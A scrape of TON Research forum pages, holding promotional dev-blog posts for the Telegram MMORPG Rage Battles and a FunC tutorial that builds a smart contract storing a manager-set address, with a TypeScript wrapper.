You should also complete the [third lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md).

## Tests for the Proxy Smart Contract

For our proxy smart contract, we will write the following tests:

-   When a message is sent to the contract from the owner, it should not be forwarded
-   The remaining conditions from the [third lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md) should be met

## Testing the Proxy Contract Call by its Owner
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/4lesson/forthlesson.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 4309

[TON Research](/)

# [Rage Battles | MMORPG | Dev Blog](/t/rage-battles-mmorpg-dev-blog/4309)

[Application](/c/application/gamefi/35)  [GameFi](/c/application/gamefi/35) 

    

[ghostsbff](https://tonresear.ch/u/ghostsbff)   April 3, 2024, 2:36pm  1

Hey gamers! Let us introduce you a gem in our ecosystem: **Rage Battles MMORGPG on TON.**  
We are excited to share our development blog to keep you posted about all the updates happening in our game as well as the lore and history of the Magic TON World. Get ready to embark on an exciting journey through the magical lands. It will be fun!

[![image](https://tonresear.ch/uploads/default/optimized/2X/a/a70917f351e9ef582bc80336989e69ca44713cf1_2_690x278.jpeg)

image1560×630 77.1 KB

](https://tonresear.ch/uploads/default/original/2X/a/a70917f351e9ef582bc80336989e69ca44713cf1.jpeg "image")

Rage Battles is a turn-based tactical MMORPG of the new generation in the medieval fantasy genre, right in Telegram. The game is in early access, with developers consistently releasing new updates and periodically hosting tournaments and contests where you can win TON.  
The game is unique in that, developers (with some exceptions) do not sell in-game items. Resources, equipment, and other items are acquired and sold directly by the players themselves, thereby forming a free market.

![image](https://tonresear.ch/uploads/default/original/2X/3/39588dddf9a708445a24a1e593797ee459031b13.jpeg)

In the game, PvP and PvE battles are already available. The mechanics of these battles are extremely simple: you select “Abandoned Mine” and venture into this dungeon, encounter an opponent, and dominate them using the control menu. The battle consists of rounds where you take turns pressing buttons representing body parts: first, you choose the area to attack, then two areas to defend, and the opponent performs similar actions.

![image](https://tonresear.ch/uploads/default/original/2X/2/2aaac31e481211f43ddc6eec0be1a79f865e74af.jpeg)

Winning battles gives you a chance to obtain equipment — initially, it could be a basic knife, but with each new victory, the chances of finding something valuable increase. If you’re lucky, you can loot equipment from your opponent, rejoice, and if you wish, head to the [forum](https://t.me/RageBattlesChat) to sell the acquired equipment for [TON](https://www.coingecko.com/en/coins/toncoin).

Each battle consumes energy, which accumulates at a rate of 1 unit every 20 minutes. You can check your energy in the pinned message or in the character menu, which is hidden behind the “Character” button. There, you can also equip the acquired gear and view the character’s advanced parameters. You can redistribute your stats at any time when you realize it’s necessary!

And when you’ve grown a bit, you can head straight to the “Arena” to test your skills against live opponents. There, the chances of obtaining equipment will be higher. Don’t forget to subscribe to the game’s [chat](https://t.me/ragebattleschat), where you can always find suitable opponents and chat with like-minded players.

Let’s find out together what hides behind the City Gate: [Play Rage Battles now](https://t.me/RageBattlesBot)

[![image](https://tonresear.ch/uploads/default/original/2X/9/94e8fd7183db0fbf882e770fee672d3829b5e732.jpeg)

image424×533 101 KB

](https://tonresear.ch/uploads/default/original/2X/9/94e8fd7183db0fbf882e770fee672d3829b5e732.jpeg "image")

  2 Likes

[ghostsbff](https://tonresear.ch/u/ghostsbff)  April 4, 2024, 3:43pm  2

Hey warriors! ![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:")  
We’re thrilled to open up our plans, aimed at making the game even more captivating and enjoyable.

[![image](https://tonresear.ch/uploads/default/optimized/2X/f/fe99ef449cf65d15563c0c309cd7f7060b796e27_2_491x500.jpeg)

image1257×1280 101 KB

](https://tonresear.ch/uploads/default/original/2X/f/fe99ef449cf65d15563c0c309cd7f7060b796e27.jpeg "image")

Our signature approach as game developers is that we don’t sell equipment, potions and other in-game items. Players farm and sell assets to each other, and we only earn commissions from these transactions. Thus, the main profit goes to the players. In our turn, we’re incredibly motivated to make the game enjoyable for everyone to actively engage with, rather than just focusing on gambling.

Don’t forget about a referral system that is now available in the Library. Bring your friends along - it’s more fun together! ![:people_hugging:](https://tonresear.ch/images/emoji/twitter/people_hugging.png?v=12 ":people_hugging:")

![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:") [Play Rage Battles now!](https://t.me/RageBattlesBot) ![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:")

• [TG Channel](https://t.me/ragebattlesen) • [Guide](https://telegra.ph/Rage-Battles-Guide-03-21) • [Rage Battles X](https://twitter.com/RageBattles) • [Reddit](https://www.reddit.com/user/RageBatt) •

  2 Likes

[ghostsbff](https://tonresear.ch/u/ghostsbff)  April 5, 2024, 4:17pm  3

Today we want to get back in time straight to the first Rage Battles devlog, that was posted more than a year ago, to immerse together in the exciting details of Rage Battles creation and development. Keep track of the next posts to continue learning more about the game we all love.

We also recommend subscribing to our Telegram channels where we post more content about the game.  
[Rage Battles Game](https://t.me/RageBattlesBot)  
[EN Channel](https://t.me/ragebattlesen)  
[RU Channel](https://t.me/ragebattles)

**MMORPG Rage Battles: Devlog 1**

As we already know, Rage Battles is a turn-based multiplayer role-playing game set in the medieval fantasy genre in Telegram. Here we fight magical creatures tormenting the TON world, defeat other players in tournaments, explore dark dungeons in search of treasures, develop, and equip our characters.

[![One of the logo concepts](https://tonresear.ch/uploads/default/optimized/2X/b/b9beb413dc84988662815f9666ee716ef7bfadc1_2_499x500.jpeg)

One of the logo concepts1279×1280 84.1 KB

](https://tonresear.ch/uploads/default/original/2X/b/b9beb413dc84988662815f9666ee716ef7bfadc1.jpeg "One of the logo concepts")

In our first devlog, we talked about the game itself, its current build, and upcoming innovations.  
At the moment it was written, the game already was in the open beta stage, which means that anyone could test it out, give feedback, make suggestions, or report any bugs they encountered. At that stage, PvP, PvE, the initial character stat system, and some equipment were already implemented in the game.  
Now, let’s delve into all of this in more detail.

[![In-game UI](https://tonresear.ch/uploads/default/optimized/2X/0/09e6d40a739eb4ad45a72c6687fe636e99c2afbe_2_690x388.jpeg)

In-game UI1280×720 112 KB

](https://tonresear.ch/uploads/default/original/2X/0/09e6d40a739eb4ad45a72c6687fe636e99c2afbe.jpeg "In-game UI")

The combat system of the game features a familiar mechanic to many old-school players of Fight Club, Carnage, and similar titles, where turn-based battles take place. In each round, you’ll have to choose where to strike on the opponent’s body and block on your own. You can fight against rats in urban sewers or on the arena against both unfamiliar players and even your friends to finally check who’s cooler!

[![This is, however, not how arena looks :)](https://tonresear.ch/uploads/default/optimized/2X/5/54b07d17eabf8b2848132508b39eab871ba1c72f_2_690x375.jpeg)

This is, however, not how arena looks :)1280×697 80.8 KB

](https://tonresear.ch/uploads/default/original/2X/5/54b07d17eabf8b2848132508b39eab871ba1c72f.jpeg "This is, however, not how arena looks :)")

Before the battle started, players had to distribute manually their character’s stats, which could greatly influence the outcome of the battle. If they did not do so - the sewer rat became their Arch-nemesis. Today, these stats are distributed by default, but you can redistribute anytime. You always know your character better!

[![Characters concept](https://tonresear.ch/uploads/default/optimized/2X/e/e0d6249f4183dd21768b4f692ec76f3c1177acea_2_690x432.jpeg)

Characters concept1280×803 88 KB

](https://tonresear.ch/uploads/default/original/2X/e/e0d6249f4183dd21768b4f692ec76f3c1177acea.jpeg "Characters concept")

The stats determine how hard your character hits, dodges, or deals critical or double strikes, as well as their health reserve. You can always find more information about up-to-date stats system in the Library, right in the game.

[![The librarian ;)](https://tonresear.ch/uploads/default/optimized/2X/b/b33d15fdfc929877d06b855686b84e3bf465b0a6_2_500x500.jpeg)

The librarian ;)1000×1000 150 KB

](https://tonresear.ch/uploads/default/original/2X/b/b33d15fdfc929877d06b855686b84e3bf465b0a6.jpeg "The librarian ;)")

The main focus right then was on the locations. We wanted characters to be able to move beyond the city limits, encountering various situations and events that would influence their future fate.  
Visiting a location is designed as a short session consisting of a series of random events, including encounters with dangerous monsters. But you should always be careful, as an unprepared traveler shouldn’t linger outside the city walls for too long - danger lurks at every step.

[![First location concept suggested in our Telegram channel](https://tonresear.ch/uploads/default/optimized/2X/0/016e4ab43a2052d7ac3c9af7ef35505e38b9d14b_2_690x388.jpeg)

First location concept suggested in our Telegram channel1280×720 158 KB

](https://tonresear.ch/uploads/default/original/2X/0/016e4ab43a2052d7ac3c9af7ef35505e38b9d14b.jpeg "First location concept suggested in our Telegram channel")

As is known, every adventure begins with preparation, and no decent adventurer can do without quality equipment. Therefore, another focus was on enriching the game with new equipment that could be obtained not only in the arena but also outside the city. At that time, a year ago, equipment that enhanced your character could be obtained only by winning PvP battles. Now you can loot monsters or trade equipment with other players.

[![Guard's breastplate, on the equipment pieces present in game](https://tonresear.ch/uploads/default/original/2X/6/6756e9f06c62ac75df25454267fa502505184326.jpeg)

Guard's breastplate, on the equipment pieces present in game512×512 31.9 KB

](https://tonresear.ch/uploads/default/original/2X/6/6756e9f06c62ac75df25454267fa502505184326.jpeg "Guard's breastplate, on the equipment pieces present in game")

We were (and we are!) actively working on other aspects of the game: finding and fixing various bugs, composing music for locations, working on the character’s profile, and other components of the game.

Go and try Rage Battles now while we’re preparing next publications about further game development.  
![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:") [Play Rage Battles now!](https://t.me/RageBattlesBot) ![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:")

• [TG Channel](https://t.me/ragebattlesen) • [Guide](https://telegra.ph/Rage-Battles-Guide-03-21) • [Rage Battles X](https://twitter.com/RageBattles) • [Reddit](https://www.reddit.com/user/RageBatt) •

  2 Likes

[ghostsbff](https://tonresear.ch/u/ghostsbff)  April 8, 2024, 3:38pm  4

**MMORPG Rage Battles: Launch of Referral System and New Equipment | Devlog 2**

The second devlog was released just recently, in the end of March, after a highly important update of the game. Let’s look closer!

[![New equipment items](https://tonresear.ch/uploads/default/optimized/2X/5/5b8b0f99725de49a2d30b4eb3a2c5b4f4ddd6c63_2_500x500.jpeg)

New equipment items1000×1000 201 KB

](https://tonresear.ch/uploads/default/original/2X/5/5b8b0f99725de49a2d30b4eb3a2c5b4f4ddd6c63.jpeg "New equipment items")

We had finally added helmets to the game! By the way, you can get them for free!

The referral system had been introduced, which means playing with friends became much more interesting. Now, in addition to arena battles, you can earn extra rewards in the form of limited helmets for referring a friend who meets certain conditions.

[![Referral Program menu in the in-game Library](https://tonresear.ch/uploads/default/optimized/2X/3/392f18a8cd3477ca44fcc14156fa0f5b7f3b79bb_2_340x500.jpeg)

Referral Program menu in the in-game Library449×659 141 KB

](https://tonresear.ch/uploads/default/original/2X/3/392f18a8cd3477ca44fcc14156fa0f5b7f3b79bb.jpeg "Referral Program menu in the in-game Library")

**To use the referral system, please follow a few simple steps:**

1.  Open our [game bot](https://t.me/RageBattlesBot).
2.  Go to Library from the main menu
3.  Select the “Referral Program”
4.  Share your referral link or use Telegram sharing functionality to invite friends!

For every referred player who reaches level 3, you will receive one of three unique helmets.  
The invited players have their interest, too: they will receive a random equipment item from the starter set. To claim the reward, level 5 is required.

The following items had been also added to the game: Stone Axe, Stone Club, Beekeeper’s Hood, and Ragamuffin Robe.  
The latter two belong to primitive items; you can obtain them as rewards for investigating the Abandoned Mine.

**Full list of updates:**

*   The referral system (can be found in the Library): now by referring a friend, you can receive unique helmets: Plague Doctor Mask, Dragon Mask, or Helmet of Horror.
*   New equipment items: Stone Axe, Stone Club, Beekeeper’s Hood, and Ragamuffin Robe, which can be obtained after the first defeat in the arena or dungeon.
*   Chat changes: by sending the /info command in the chat, you can display information about your character. After sending this command in response to someone’s message, information about that person will be displayed.
*   Player requests: the button for texting a user after a match has been moved below.
*   Monsters in the dungeon can now change their combat tactics once a week. Be aware - they are growing with you!
*   Improved English localization of the game.

Come and join us in the Abandoned Mine and don’t forget to bring your friends for benefits!

![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:") [Play Rage Battles now!](https://t.me/RageBattlesBot) ![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:")

• [TG Channel](https://t.me/ragebattlesen) • [TG Chat](https://t.me/ragebattleschaten) • [Guide](https://telegra.ph/Rage-Battles-Guide-03-21) • [Rage Battles X](https://twitter.com/RageBattles) • [Reddit](https://www.reddit.com/user/RageBatt) •

  2 Likes

[ghostsbff](https://tonresear.ch/u/ghostsbff)  April 9, 2024, 6:43pm  5

**MMORPG Rage Battles: Encounter with the Steel Rat | Devlog 3**

We continue to actively develop our project, which means that another update for Rage Battles Game has been released.  
So what’s new?  
The main highlight is undoubtedly the introduction of a new special mob, the Steel Rat, with its unique ferocity and increased chance of dropping valuable equipment.

To embark on the search for the Steel Rat, you need to venture into the PVE location called Abandoned Mine.

[![Steel Mouse concept](https://tonresear.ch/uploads/default/optimized/2X/5/5f4e0a26114cf73999a6dc025f52a486247efff6_2_500x500.jpeg)

Steel Mouse concept1000×1000 143 KB

](https://tonresear.ch/uploads/default/original/2X/5/5f4e0a26114cf73999a6dc025f52a486247efff6.jpeg "Steel Mouse concept")

Attention has been given to the English-speaking community, which has been actively growing lately — we now have our own chat. A bunch of bugs has been fixed, and the character menu has been beautified.

**Here is the full list of changes:**

1.  The new special mob -Steel Rat, with an increased chance of dropping basic equipment.
2.  A new logic of pinned message; now it’s impossible to lose it, even if Telegram is deleted from the device.
3.  Created an English-speaking chat - to access the arena, players should enter either the RU or EN chat.
4.  A new menu for the referral program, preventing referral recipients from simply clicking on a regular link.
5.  A new button in the pinned message for quick access to the chat.
6.  Upon leveling up, in the battle results, a prompt has been added reminding players of redistributing their stats.
7.  Improved localization of equipment names in messages about receiving equipment.
8.  Fixed an issue occurring when previously registered players try to follow a referral link.
9.  Fixed a bug with players accessing Arena with 0 energy.
10.  Added an “OK” button to informational messages within the bot to close a message.
11.  Finalized translation for the character menu. Now, the item transfer window and all other character menu options are fully available in two languages.
12.  Fixed an issue with displaying energy in the character menu.
13.  Now it will be impossible to reset attributes if there are remaining attribute points available.
14.  Pop-ups in the character menu now close properly.
15.  Fixed displaying items on the character.
16.  Fixed displaying the character menu.

[![This is how we imagine you and your friends on Arena](https://tonresear.ch/uploads/default/optimized/2X/9/9108a49a5894a48511e6549f1d483e2187d15f43_2_500x500.jpeg)

This is how we imagine you and your friends on Arena1024×1024 139 KB

](https://tonresear.ch/uploads/default/original/2X/9/9108a49a5894a48511e6549f1d483e2187d15f43.jpeg "This is how we imagine you and your friends on Arena")

Invite your friends via our Referral Program found in Library and test out these changes live!

![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:") [Play Rage Battles now!](https://t.me/RageBattlesBot) ![:crossed_swords:](https://tonresear.ch/images/emoji/twitter/crossed_swords.png?v=12 ":crossed_swords:")

• [TG Channel](https://t.me/ragebattlesen) • [TG Chat](https://t.me/ragebattleschaten) • [Guide](https://telegra.ph/Rage-Battles-Guide-03-21) • [Rage Battles X](https://twitter.com/RageBattles) • [Reddit](https://www.reddit.com/user/RageBatt) •

  2 Likes

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 431

[TON Research](/)

# [Create Smart Contracts on TON - Lesson 5 Remembering the Address and Identifying the Operation](/t/create-smart-contracts-on-ton-lesson-5-remembering-the-address-and-identifying-the-operation/431)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:34pm  1

## [](#introduction-1)Introduction

In this lesson, we will write a smart contract that can perform different operations depending on the flag in the TON blockchain using the FunC language, and we will test it in the next lesson.

## [](#requirements-2)Requirements

To complete this lesson, you only need to install [Node.js](https://nodejs.org). It is recommended to install one of the latest versions, such as 18.

You should also be able to create/deploy a project using Blueprint. You can learn how to do this in the [first lesson](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#op-identifying-the-operation-3)Op - Identifying the Operation

Before we consider what kind of smart contract we will create in this lesson, I suggest studying the [recommendations](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages) on the body of a smart contract message.

In order to create a client-server-like architecture on smart contracts, it is recommended to start each message (strictly speaking, the message body) with a 32-bit flag `op`, which will identify the operation that the smart contract should perform. The contract itself, based on the value of this flag, should perform the necessary operation and, if necessary, send a response message, which will also include some `op`.

In this lesson, we will create a smart contract that performs various actions depending on the `op`.

## [](#smart-contract-4)Smart Contract

The task of the smart contract will be to remember the address set by the manager and report it to anyone who requests it, in particular the following functionality:

*   When the contract receives a message from the Manager with `op` equal to 1 followed by some `query_id`, followed by `MsgAddress`, it should save the received address in storage.
*   When the contract receives an internal message from any address with `op` equal to 2 followed by `query_id`, it should respond to the sender with a message body containing:
    *   `op` equal to 3
    *   the same `query_id`
    *   Manager’s address
    *   The address that was remembered since the last manager request (empty address `addr_none` if there has not been a manager request yet)
    *   The TON value attached to the message minus the processing fee.
*   When the smart contract receives any other message, it should throw an exception.

**Note**: I decided to take ideas for smart contracts from the [FunC contest1](https://github.com/ton-blockchain/func-contest1) tasks, as they are very well suited for getting acquainted with TON smart contract development.

## [](#smart-contract-structure-5)Smart Contract Structure

##### [](#external-method-6)External Method

To allow our proxy to receive messages, we will use the external method `recv_internal()`, as in previous lessons.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#inside-the-method-7)Inside the Method

Inside the method, we will take `op`, `query_id`, and the sender’s address `sender_address` from the function arguments, and then build the logic around `op` using conditional statements.

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
 ;; take op, query_id, and the sender's address sender_address

  if (op == 1) {
    ;; here we will save the address received from the manager
  } elseif (op == 2) {
      ;; send a message
  } else {
      ;; here will be an exception
  }
}
```

## [](#helper-functions-8)Helper Functions

Let’s think about what functionality we can extract into functions.

*   Comparing addresses to check if the request with op equal to 1 came from the Manager.
*   Loading and saving the manager’s address and the address we store in the contract’s persistent data.
*   Parsing the sender’s address from the incoming message.

##### [](#comparing-addresses-9)Comparing Addresses

FunC supports defining functions in assembly (referring to Fift). This is done as follows - we define a function as a low-level TVM primitive. For the comparison function, it will look like this:

```
int equal_slices (slice a, slice b) asm "SDEQ";
```

As you can see, the `asm` keyword is used.

You can see the list of possible primitives in the [documentation](https://docs.ton.org/learn/tvm-instructions/instructions).

##### [](#loading-addresses-from-persistent-data-10)Loading Addresses from Persistent Data

We will store addresses in slices, but based on the task, we will need to store two addresses: the Manager’s address, for verification, and the address that the manager will send for storage. Therefore, we will return the slices in a tuple.

To “retrieve” the persistent data, we will need two functions from the [FunC standard library](https://docs.ton.org/develop/func/stdlib/).

Namely:  
`get_data` - retrieves a cell from the persistent data.  
`begin_parse` - converts the cell into a slice.

Let’s pass this value to the variable `ds`:

```
var ds = get_data().begin_parse()
```

Load the manager’s address from the message using `load_msg_addr()` - which loads the only prefix from the slice that is a valid MsgAddress. We have two of them, so we “subtract” twice.

```
return (ds~load_msg_addr(), ds~load_msg_addr());
```

In the end, we get the following function:

```
(slice, slice) load_data () inline {
  var ds = get_data().begin_parse();
  return (ds~load_msg_addr(), ds~load_msg_addr());
}
```

##### [](#inline-11)Inline

In previous lessons, we have already used the `inline` specifier, which essentially inserts the code at each call site of the function. In this lesson, let’s consider why this is necessary from a practical point of view.

As we know from the [documentation](https://docs.ton.org/develop/smart-contracts/fees), the transaction fee consists of:

*   storage\_fees - the fee for space in the blockchain.
*   in\_fwd\_fees - the fee for importing messages (this is the case when processing `external` messages).
*   computation\_fees - the fee for executing TVM instructions.
*   action\_fees - the fee associated with processing a list of actions (e.g., sending messages).
*   out\_fwd\_fees - the fee for importing outgoing messages.

More details [here](https://docs.ton.org/develop/smart-contracts/fees).  
The `inline` specifier allows you to save **computation\_fee**.

By default, when you have a FunC function, it gets its own identifier stored in a separate id->function dictionary, and when you call it somewhere in the program, the function is looked up in the dictionary and then jumped to.

The `inline` specifier, on the other hand, puts the body of the function directly into the parent function’s code.

Therefore, if a function is used only once or twice, it is often much cheaper to declare this function as `inline`, i.e., inline it, as a reference jump is much cheaper than a dictionary lookup and jump.

##### [](#saving-addresses-to-persistent-data-12)Saving Addresses to Persistent Data

Of course, in addition to unloading, we also need loading. Let’s create a function that saves the manager’s address and the address that the manager will send:

```
() save_data (slice manager_address, slice memorized_address) impure inline {

}
```

Note that the function has the [specifier](https://docs.ton.org/develop/func/functions#specifiers) `impure`. We must specify the `impure` specifier if the function can modify the contract’s storage. Otherwise, the FunC compiler may remove this function call.

To “save” the persistent data, we will need functions from the [FunC standard library](https://docs.ton.org/develop/func/stdlib/).

Namely:

`begin_cell()` - creates a Builder for the future cell.  
`store_slice()` - stores a Slice in the Builder.  
`end_cell()` - creates a Cell.

`set_data()` - writes the cell to the persistent data.

Assemble the cell:

```
begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell()
```

Load it into the contract’s persistent data:

```
set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
```

In the end, we get the following function:

```
() save_data (slice manager_address, slice memorized_address) impure inline {
    set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
}
```

##### [](#parsing-the-senders-address-from-the-incoming-message-13)Parsing the Sender’s Address from the Incoming Message

Let’s declare a function that allows us to extract the sender’s address from the message cell. The function will return a slice, as we will take the address using `load_msg_addr()`, which loads the only prefix from the slice that is a valid MsgAddress and returns it as a slice.

```
slice parse_sender_address (cell in_msg_full) inline {
  return sender_address;
}
```

Now, using the already familiar `begin_parse`, let’s convert the cell into a slice.

```
slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  return sender_address;
}
```

Start “reading” the cell using `load_uint`, a function from the [FunC standard library](https://docs.ton.org/develop/func/stdlib/) that loads an n-bit unsigned integer from the slice.

In this lesson, we will not go into detail about the flags, but you can read more about them in the [documentation](https://docs.ton.org/develop/smart-contracts/messages#message-layout).  
And finally, take the address.

In the end, we get the following function:

```
slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}
```

## [](#intermediate-result-14)Intermediate Result

At this point, we have the ready-made helper functions and the body of the main function of this smart contract `recv_internal()`.

```
#include "imports/stdlib.fc";

int equal_slices (slice a, slice b) asm "SDEQ";

(slice, slice) load_data () inline {
  var ds = get_data().begin_parse();
  return (ds~load_msg_addr(), ds~load_msg_addr());
}

() save_data (slice manager_address, slice memorized_address) impure inline {
  set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  int op = in_msg_body~load_int(32);
  int query_id = in_msg_body~load_uint(64);
  var sender_address = parse_sender_address(in_msg_full);

  if (op == 1) {
    (slice manager_address, slice memorized_address) = load_data();
    throw_if(1001, ~ equal_slices(manager_address, sender_address));
    slice new_memorized_address = in_msg_body~load_msg_addr();
    save_data(manager_address, new_memorized_address);
  } elseif (op == 2) {
    (slice manager_address, slice memorized_address) = load_data();
    var msg = begin_cell()
        .store_uint(0x10, 6)
        .store_slice(sender_address)
        .store_grams(0)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_uint(3, 32)
        .store_uint(query_id, 64)
        .store_slice(manager_address)
        .store_slice(memorized_address)
      .end_cell();
    send_raw_message(msg, 64);
  } else {
    throw(3);
  }
}
```

Now we just need to fill in `recv_internal()`.

## [](#filling-in-the-external-method-15)Filling in the External Method

##### [](#taking-op-query_id-and-the-senders-address-16)Taking op, query\_id, and the sender’s address

We read op and query\_id from the message body accordingly. According to the [recommendations](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages), these are 32-bit and 64-bit values.

Also, using the function `parse_sender_address()` that we wrote earlier, we take the sender’s address.

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
int op = in_msg_body~load_int(32);
int query_id = in_msg_body~load_uint(64);
var sender_address = parse_sender_address(in_msg_full);

  if (op == 1) {
    ;; here we will save the address received from the manager
  } elseif (op == 2) {
    ;; send a message
  } else {
    ;; here will be an exception
  }
}
```

##### [](#flag-op-1-17)Flag op == 1

According to the task, when the flag is 1, we should receive the manager’s address and the saved address, check if the sender’s address is equal to the manager’s address (only the manager can change the address), and save the new address that is stored in the message body.

Load the manager’s address `manager_address` and the saved address `memorized_address` from the persistent data using the `load_data()` function we wrote earlier.

```
(slice manager_address, slice memorized_address) = load_data();
```

Using the `equal_slices` function and the unary operator `~`, which is a bitwise NOT, check the equality of the addresses, throwing an exception if the addresses are not equal.

```
throw_if(1001, ~ equal_slices(manager_address, sender_address));
```

Take the address using `load_msg_addr()` and save the addresses using the `save_data()` function we wrote earlier.

```
slice new_memorized_address = in_msg_body~load_msg_addr();
save_data(manager_address, new_memorized_address);
```

##### [](#flag-op-2-18)Flag op == 2

According to the task, when the flag is 2, we should send a message with a body containing:

*   `op` equal to 3
*   the same `query_id`
*   Manager’s address
*   The address that was remembered since the last manager request (empty address `addr_none` if there has not been a manager request yet)
*   The TON value attached to the message minus the processing fee.

Before sending the message, load the addresses stored in the contract.

```
(slice manager_address, slice memorized_address) = load_data();
```

You can familiarize yourself with the complete message structure [here - message layout](https://docs.ton.org/develop/smart-contracts/messages#message-layout). But usually, we don’t need to control each field, so we can use the short form from the [example](https://docs.ton.org/develop/smart-contracts/messages):

```
var msg = begin_cell()
    .store_uint(0x10, 6)
    .store_slice(sender_address)
    .store_grams(0)
    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
    .store_uint(3, 32)
    .store_uint(query_id, 64)
    .store_slice(manager_address)
    .store_slice(memorized_address)
  .end_cell();
```

Send the message according to the conditions:

```
send_raw_message(msg, 64);
```

##### [](#exception-19)Exception

Here it is simple, we use the regular `throw` from the [built-in FunC modules](https://docs.ton.org/develop/func/builtins#throwing-exceptions).

```
throw(3);
```

## [](#complete-smart-contract-code-20)Complete Smart Contract Code

```
#include "imports/stdlib.fc";

int equal_slices (slice a, slice b) asm "SDEQ";

(slice, slice) load_data () inline {
  var ds = get_data().begin_parse();
  return (ds~load_msg_addr(), ds~load_msg_addr());
}

() save_data (slice manager_address, slice memorized_address) impure inline {
  set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  int op = in_msg_body~load_int(32);
  int query_id = in_msg_body~load_uint(64);
  var sender_address = parse_sender_address(in_msg_full);

  if (op == 1) {
    (slice manager_address, slice memorized_address) = load_data();
    throw_if(1001, ~ equal_slices(manager_address, sender_address));
    slice new_memorized_address = in_msg_body~load_msg_addr();
    save_data(manager_address, new_memorized_address);
  } elseif (op == 2) {
    (slice manager_address, slice memorized_address) = load_data();
    var msg = begin_cell()
        .store_uint(0x10, 6)
        .store_slice(sender_address)
        .store_grams(0)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_uint(3, 32)
        .store_uint(query_id, 64)
        .store_slice(manager_address)
        .store_slice(memorized_address)
      .end_cell();
    send_raw_message(msg, 64);
  } else {
    throw(3);
  }
}
```

## [](#typescript-wrapper-21)TypeScript Wrapper

To interact with our smart contract conveniently, let’s write a TypeScript wrapper. The base for it is already provided by Blueprint.

### [](#contract-data-config-22)Contract Data Config

Open the file `wrappers/AddressSaver.ts` (the file name may be different depending on how you created the project).  
Let’s start with changes to the data config. Our contract contains two values in its data: the manager’s address and the saved address. Let the saved address be empty by default (an empty address can be written as two zeros, i.e., uint2 with a value of 0). Add these values to the config:

```
export type AddressSaverConfig = {
    manager: Address;
};

export function addressSaverConfigToCell(config: AddressSaverConfig): Cell {
    return beginCell().storeAddress(config.manager).storeUint(0, 2).endCell();
}
```

Now let’s move on to the `AddressSaver` class to add methods for calling the operations we need.

### [](#method-for-calling-op-1-23)Method for Calling op = 1

When calling the operation with code 1, we should put op=1, query\_id, and the new address that we want to save in the contract in the message body. Let’s name the method `sendChangeAddress` (I remind you that methods that send messages to the contract must have the `send` prefix).

```
async sendChangeAddress(provider: ContractProvider, via: Sender, value: bigint, queryId: bigint, newAddress: Address) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(1, 32).storeUint(queryId, 64).storeAddress(newAddress).endCell(),
    });
}
```

### [](#method-for-calling-op-2-24)Method for Calling op = 2

This operation does not require any additional data except op=2 and query\_id. Let’s name the method `sendRequestAddress`.

```
async sendRequestAddress(provider: ContractProvider, via: Sender, value: bigint, queryId: bigint) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(2, 32).storeUint(queryId, 64).endCell(),
    });
}
```

## [](#conclusion-25)Conclusion

We will write tests in the next lesson. I also wanted to say a special thank you to those who donate TON to support the project, it is very motivating and helps to release lessons faster.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/5lesson/fifthlesson.md)

